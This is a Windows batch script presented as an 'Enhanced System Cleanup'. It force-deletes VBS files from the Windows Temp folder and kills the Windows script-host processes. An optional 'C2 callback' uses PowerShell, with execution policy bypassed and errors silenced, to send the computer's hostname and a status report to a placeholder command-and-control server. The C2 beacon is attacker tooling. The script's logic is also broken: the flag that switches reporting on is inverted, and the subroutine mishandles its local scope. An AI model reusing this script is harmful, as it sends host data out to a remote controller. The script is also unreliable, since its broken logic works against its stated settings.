@echo off
setlocal enabledelayedexpansion

REM ==========================================================================
REM Script: Enhanced System Cleanup
REM Author: Donwell
REM Version: 1.2 (Improved)
REM License: Public Domain
REM Date: 2025-05-30
REM Description: Deletes .vbs files and terminates wscript.exe/cscript.exe.
REM              Includes error handling, subroutines, and optional C2 ping.
REM ==========================================================================

echo [+] Enhanced System Cleanup Script v1.2
echo [+] ------------------------------------
echo.

REM --- Configuration ---
set "TARGET_TEMP_PATH=C:\Windows\Temp"
set "VBS_FILES_PATTERN=*.vbs"
set "FULL_VBS_PATH=%TARGET_TEMP_PATH%\%VBS_FILES_PATTERN%"

set "LOG_VERBOSE=true"
set "C2_URL=http://your-c2-server.com/report"
set "ENABLE_C2_REPORTING=false"

set "SCRIPT_OVERALL_STATUS=SUCCESS"
set "ERROR_MESSAGES="

REM --- Admin Priv Check ---
echo [+] Checking for Administrator privileges...
openfiles >nul 2>&1
if !ERRORLEVEL! neq 0 (
    echo [!] WARNING: Insufficient privileges. Some operations may fail.
    set "SCRIPT_OVERALL_STATUS=WARNING_PRIVILEGES"
) else (
    echo [+] Administrator privileges detected.
)
echo.

REM --- Delete .vbs files ---
echo [+] Deleting VBS files from '%FULL_VBS_PATH%'...
if exist "%FULL_VBS_PATH%" (
    del /F /Q "%FULL_VBS_PATH%"
    if !ERRORLEVEL! neq 0 (
        echo [!] ERROR: Failed to delete some .vbs files (Errorlevel: !ERRORLEVEL!).
        set "SCRIPT_OVERALL_STATUS=FAILURE"
        set "ERROR_MESSAGES=!ERROR_MESSAGES!VBS_DELETE_FAILED;"
    ) else (
        echo [+] Successfully deleted VBS files (if found).
    )
) else (
    echo [+] No .vbs files found in '%TARGET_TEMP_PATH%'.
)
echo.

REM --- Terminate Known Script Hosts ---
CALL :TerminateProcess "wscript.exe" "Windows Script Host"
CALL :TerminateProcess "cscript.exe" "Command-line Script Host"

echo [+] ------------------------------------
echo [+] Cleanup finished.
echo [+] Overall Status: !SCRIPT_OVERALL_STATUS!
if defined ERROR_MESSAGES echo [!] Errors: !ERROR_MESSAGES!
echo.

REM --- C2 Callback ---
if /I "!ENABLE_C2_REPORTING!"=="false" (
    if /I "!C2_URL!"=="http://your-c2-server.com/report" (
        echo [!] C2_REPORT_SKIPPED: Default C2_URL placeholder detected.
    ) else if "!C2_URL!"=="" (
        echo [!] C2_REPORT_SKIPPED: No C2_URL configured.
    ) else (
        echo [+] Sending status to C2 server...
        set "PAYLOAD_URL=!C2_URL!?hostname=!COMPUTERNAME!&status=!SCRIPT_OVERALL_STATUS!&script=EnhancedCleanup_v1.2&errors=!ERROR_MESSAGES!"
        echo [+] Payload URL: !PAYLOAD_URL!
        powershell -NoProfile -NonInteractive -ExecutionPolicy Bypass -Command ^
        "$ErrorActionPreference='SilentlyContinue'; try { $res=(New-Object Net.WebClient).DownloadString('!PAYLOAD_URL!'); Write-Host '[+] C2_REPORT_SENT_SUCCESS: '+$res.Substring(0, [Math]::Min($res.Length, 100)) } catch { Write-Host '[!] C2_REPORT_ERROR: '+$_.Exception.Message }"
        if !ERRORLEVEL! neq 0 (
            echo [!] C2_REPORT_ERROR: PowerShell failed or server unreachable.
            if "!SCRIPT_OVERALL_STATUS!"=="SUCCESS" set "SCRIPT_OVERALL_STATUS=WARNING_C2_FAILURE"
        ) else (
            echo [+] C2 status sent. Check logs on receiver.
        )
    )
) else (
    echo [+] C2 reporting is disabled.
)
echo.

echo [+] ------------------------------------
echo [+] Execution complete.
endlocal
pause
goto :eof

REM ==========================================================================
REM Subroutines
REM ==========================================================================

:TerminateProcess
setlocal
set "PROC_TO_KILL=%~1"
set "PROC_NAME=%~2"
if "!LOG_VERBOSE!"=="true" echo [+] Checking %PROC_NAME% (%PROC_TO_KILL%)...

tasklist /NH /FI "IMAGENAME eq %PROC_TO_KILL%" 2>NUL | find /I "%PROC_TO_KILL%" >NUL
if !ERRORLEVEL! equ 0 (
    echo [+] %PROC_NAME% is running. Terminating...
    taskkill /F /IM "%PROC_TO_KILL%" /T >NUL
    if !ERRORLEVEL! neq 0 (
        echo [!] ERROR: Could not terminate %PROC_NAME%.
        endlocal & set SCRIPT_OVERALL_STATUS=FAILURE_PROCESS_TERMINATION
        endlocal & set ERROR_MESSAGES=%ERROR_MESSAGES%TERM_%PROC_TO_KILL%_FAILED;
    ) else (
        echo [+] Terminated %PROC_NAME%.
    )
) else (
    echo [+] %PROC_NAME% not running.
)
echo.
endlocal
goto :eof
